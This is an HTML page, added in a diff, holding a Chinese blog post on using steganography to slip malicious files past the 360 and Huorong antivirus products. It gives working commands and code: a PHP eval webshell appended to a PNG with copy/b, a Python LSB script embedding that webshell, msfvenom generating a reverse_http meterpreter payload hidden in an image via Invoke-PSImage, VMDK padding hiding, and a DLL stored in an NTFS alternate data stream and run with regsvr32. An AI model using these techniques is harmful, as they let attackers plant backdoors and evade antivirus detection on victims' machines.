@@ -1,0 +1,199 @@
+<!DOCTYPE html>
+<html>
+    <head>
+    <meta charset="utf-8">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
+    <link rel="alternate icon" type="image/png" href="/img/favicon.png">
+    <title>J47erry&#39;S BLOG | 杰歪</title>
+    
+<link rel="stylesheet" href="/css/reset.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+<link rel="stylesheet" href="/css/markdown.css">
+
+    
+<link rel="stylesheet" href="/css/fonts.css">
+
+<meta name="generator" content="Hexo 6.2.0"></head>
+    <body>
+        <div class="paper">
+            <div class="paper-main">
+                
+                    <div class="post-header">
+    <a class="logo" href="/">J47erry&#39;S BLOG</a>
+    <a class="go-home" href="/">
+        <svg width="8" height="14" viewBox="0 0 8 14">
+            <path d="M7 1L1 7l6 6" stroke="#000" stroke-width="2" fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+    </a>
+</div>
+                
+                <div class="post-main">
+
+    
+        <div class="post-main-title">
+            #隐写过360、火绒
+        </div>
+        <div class="post-meta">
+            2022-11-24
+        </div>
+    
+
+    <div class="post-md">
+        <h1 id="隐写过360、火绒"><a href="#隐写过360、火绒" class="headerlink" title="隐写过360、火绒"></a>隐写过360、火绒</h1><p>一些简单的隐写demo过静态免杀。</p>
+<hr>
+<h2 id="0x00-图种"><a href="#0x00-图种" class="headerlink" title="0x00 图种"></a>0x00 图种</h2><p>利用copy命令，可以将两个文件以二进制方式连接起来，很显然，也可以将木马插入到图片里面，尝试隐写。</p>
+<pre><code>copy/b C:\...\...\Desktop\OIP-A.png + C:\...\...\Desktop\shell.php 123.png
+</code></pre>
+<p><img src="/./../images/image-20221122150611048.png" alt="image-20221122150611048">生成123.png图片里面就会存在连接密码。</p>
+<p><img src="/./../images/image-20221122151738359.png" alt="image-20221122151738359">通过360和火绒查杀，并没有检查出病毒。<img src="/./../images/image-20221122152011388.png" alt="image-20221122152011388"></p>
+<p><img src="/./../images/image-20221122152040654.png" alt="image-20221122152040654">上传看看。（感觉VT结果怪怪的。。。）</p>
+<p><img src="/./../images/image-20221122152219504.png" alt="image-20221122152219504">换成简单的一句话木马，试试。</p>
+<p><img src="/./../images/image-20221122152829693.png" alt="image-20221122152829693">原理是在图片中，是有结束符的，16进制就是FF D9，而图片查看器会自动忽视结束符之后的内容，所以图片会正常显示，利用winhex就可以看到后续的内容。</p>
+<p><img src="/./../images/image-20221122153931024.png" alt="image-20221122153931024">看到binwalk会对图片进行检查，测试发现，如果单纯的图种（png+zip），会被检测出。</p>
+<p><img src="/./../images/image-20221122155223184.png" alt="image-20221122155223184">如果只是恶意代码，并不能直接检测出来。</p>
+<p><img src="/./../images/image-20221122155301865.png" alt="image-20221122155301865">提一嘴，jpg和png方式对文件压缩不同，jpg可能会使文件损坏。</p>
+<h2 id="0x01-LSB修改"><a href="#0x01-LSB修改" class="headerlink" title="0x01  LSB修改"></a>0x01  LSB修改</h2><p>图种是在图片数据后面增添代码，LSB隐写就是直接修改有效最低位，完成数据隐藏。</p>
+<pre><code class="python">from PIL import Image as im
+import re
+    
+replace_reg = re.compile(r&#39;[1|0]$&#39;)
+    #替换最后一位的数据，source是被替换数据，target是目标数据，就是batarget放到source最后一位
+def repLstBit(source,target):
+    return replace_reg.sub(target,source)
+    #运行结果：&#39;123X&#39;
+print(repLstBit(&quot;111110&quot;,&quot;1&quot;))
+    
+    #字符串转换二进制，不够八位的话补齐8位
+def encode(s):
+    return &#39;&#39;.join(bin(ord(c)).replace(&#39;0b&#39;,&#39;&#39;).rjust(8,&#39;0&#39;) for c in s)
+    
+    #切割从图像中收集到的数据，就是把载密图像的对应最后一位提取出来之后需要进行切割
+def cut_text(text,lenth):
+    textArr = re.findall(&#39;.&#123;&#39;+str(lenth)+&#39;&#125;&#39;,text)
+    tempStr = text[(len(textArr) * lenth):]
+    if len(tempStr)!=0:
+        textArr.append(text[(len(textArr)*lenth):])
+    return textArr
+    
+    #二进制转换成字符串，看上面切割方法的注释即可理解该方法存在的意义
+def decode(s):
+    bitArr = cut_text(s,8)
+    return &quot;&quot;.join(chr(int(i,2)) for i in bitArr)
+    
+    
+    #读取宿主图像和要写入的信息生成载密图像。
+if __name__ == &#39;__main__&#39;:
+    img = im.open(&quot;C:/Users/admin/Desktop/OIP-C.png&quot;)
+    width = img.size[0]
+    height = img.size[1]
+    hideInfo = &quot;&lt;?php @eval($_POST[&#39;pass&#39;]);?&gt;&quot;
+    hideBitArr = encode(hideInfo)
+    count = 0
+    bitInfoLen = len(hideBitArr)
+    
+    print(hideBitArr)
+    for i in range(width):
+        for j in range(height):
+            if count == bitInfoLen:
+                break;
+            pixel = img.getpixel((i,j));
+            print(pixel[0])
+            sourceBit = bin(pixel[0])[2:]
+            print(sourceBit)
+            rspBit = int(repLstBit(sourceBit,hideBitArr[count]),2)
+            count += 1
+            img.putpixel((i,j),(rspBit,rspBit,rspBit))
+    img.save(&quot;C:/Users/admin/Desktop/1.png&quot;)
+</code></pre>
+<p>完成信息写入。</p>
+<p><img src="/./../images/image-20221123094619406.png" alt="image-20221123094619406"></p>
+<p>本地运行，不会报毒，不知道上传能不能正常连接使用。</p>
+<p>试试隐写shellcode。</p>
+<p>msf生成：</p>
+<pre><code>msfvenom -p windows/x64/meterpreter/reverse_http lhost=0.0.0.0 lport=1111 -fpsh-reflection&gt;12.ps1
+</code></pre>
+<p>图片和ps1文件放在同一目录下：</p>
+<pre><code>Set-ExecutionPolicy Unrestricted -Scope CurrentUser
+Import-Module .\Invoke-PSimage.ps1
+Invoke-PSImage -Script .\12.ps1 -Image .\OIP-A.png -Out .\OIP-C.jpg -Web
+</code></pre>
+<p><img src="/./../images/image-20221124205249822.png" alt="image-20221124205249822"></p>
+<p>将生成图片上传到网站进行加载，本地运行生成的shellcode，360、火绒不报毒。</p>
+<h2 id="0x02-vmdk隐写"><a href="#0x02-vmdk隐写" class="headerlink" title="0x02 vmdk隐写"></a>0x02 vmdk隐写</h2><p>vmdk作为虚拟硬盘，文件大小上限为2GB，存在跟物理硬盘一样的分区和扇区中类似的填充区域，因此，就可以把数据藏在该区域进行隐写。</p>
+<p><img src="/./../images/image-20221124100159796.png" alt="image-20221124100159796"></p>
+<p>利用winhex（不知道为啥打不开vmdk文件。。）或者010 Editor分析填充区域，确定嵌入的地方。整个虚拟磁盘中存在大量的、聚集在一起的填充区域，从虚拟文件末尾开始（EOF文件标识符）逐渐向上查找，越到文件末尾填充区域就越多。</p>
+<p>填充方式可以有两种，直接用winhex进行替换，或者用vmdk文件编辑工具进行修改。这里选择编辑工具。</p>
+<pre><code>dsfi C:\Users\10976\Desktop\1.vmdk 36864 36864 C:\Users\10976\Desktop\12.txt
+</code></pre>
+<p><img src="/./../images/image-20221124102256592.png" alt="image-20221124102256592"></p>
+<p>重新打开vmdk文件，信息成功写入。</p>
+<p><img src="/./../images/image-20221124102536982.png" alt="image-20221124102536982"></p>
+<p>上传看看。</p>
+<p><img src="/./../images/image-20221124102950632.png" alt="image-20221124102950632"></p>
+<p>在vmdk文件填充区域隐藏信息可以避免和图种一样增加文件大小，而且修改过的vmdk也可以正常运行，但是，虚拟磁盘被长期运行，隐藏数据可能会被重新覆盖，同时，vmdk文件太大了，不方便下载或者在网络中传输。</p>
+<p>同原理，PDF、DOC等文档也可以通过添加文件头进行数据隐藏，但是这种文件目标太大，感觉实战上传不太现实。。。</p>
+<h2 id="0x03-交换数据流"><a href="#0x03-交换数据流" class="headerlink" title="0x03 交换数据流"></a>0x03 交换数据流</h2><p>windows NTFS文件系统的交换数据流（ADS）也可以用来数据隐藏。</p>
+<p>ADS数据流文件作为系统中的隐身人在渗透中作用还是很大，这里主要说免杀的应用。</p>
+<p>简单认识一下，创建交换数据流，</p>
+<pre><code>notepad visiable.txt:hidden.txt
+</code></pre>
+<p><img src="/./../images/image-20221124114335985.png" alt="image-20221124114335985"></p>
+<p>查看创建的文件，字节为0，数据被隐藏，</p>
+<p><img src="/./../images/image-20221124114427016.png" alt="image-20221124114427016"></p>
+<p>ADS数据流文件存在形式就有两种：一是依赖宿主文件，二是单独ADS文件。前者ADS一般很难清理，所以将dll文件写入该文件内测试免杀再好不过了。</p>
+<pre><code>type 123.dll &gt; 111.txt:ms
+</code></pre>
+<p>可以看见执行完命令的txt文件并没有改变，</p>
+<p><img src="/./../images/image-20221124211405436.png" alt="image-20221124211405436"></p>
+<p>用360、火绒进行查杀，基本不报毒，不过，用def一扫，就没了。。。（毕竟dddd）</p>
+<p><img src="/./../images/image-20221124212117231.png" alt="image-20221124212117231"></p>
+<p>（测试过程发现一点，如果寄主文件目录发生变化，ADS数据流文件自动消失）</p>
+<p>运行dll：</p>
+<pre><code>regsvr32 111.txt:ms
+</code></pre>
+<p>看到有说360会对这种dll文件进行动态查杀，但是我本地测试没问题，不太懂了，不过，ADS在WEB安全中的利用值得学习研究一下。</p>
+<h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>总而言之，言而总之，数据隐藏的范围很大，包括但不限于还可以在图片的载体中、在双图中、在TCP中、可执行文件中、TTL字段中等等等进行隐藏，可以进一步学习。目前，接触隐写术，只是觉得好玩哈哈哈。</p>
+<hr>
+<pre><code>参考博客：
+
+shellcode隐写RGB过火绒、360————
+https://0range-x.github.io/2021/12/28/shellcode%E9%9A%90%E5%86%99RGB%E8%BF%87%E6%9F%9060%E6%9F%90%E7%BB%92/
+
+数据隐藏技术————http://tttang.com/archive/1181/#toc_0x00
+
+图片隐写术总结————https://blog.csdn.net/riba2534/article/details/70544076
+
+Windows ADS在渗透测试中的妙用————https://www.freebuf.com/articles/terminal/195721.html
+</code></pre>
+
+    </div>
+
+</div>
+                <div class="footer">
+    <span>Copyright © 2022 J47erry&#39;S BLOG</span>
+    <span>Theme Designed By <a target="_blank" href="https://zheli.design/one-paper">這Li</a></span>
+</div>
+
+
+<link rel="stylesheet" href="/css/a11y-dark.min.css">
+
+
+<script src="/js/highlight.min.js"></script>
+
+
+<script src="/js/highlightjs-line-numbers.js"></script>
+
+
+<script>
+    hljs.initHighlightingOnLoad();
+    hljs.initLineNumbersOnLoad();
+</script>
+
+            </div>
+        </div>
+    </body>
+</html>
